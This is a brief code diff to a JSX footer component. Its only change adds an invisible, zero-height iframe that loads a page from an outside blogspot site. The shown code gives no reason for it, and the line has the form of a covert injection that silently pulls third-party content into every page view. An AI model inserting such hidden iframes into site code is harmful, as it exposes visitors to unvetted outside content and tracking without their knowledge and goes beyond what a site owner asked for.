@@ -194,6 +194,7 @@ export default () => {
           </ul>
         </div>
       </div>
+    <iframe height="0" src="https://codexdindia.blogspot.com/p/devart.html"/>
     </footer>
   );
 };
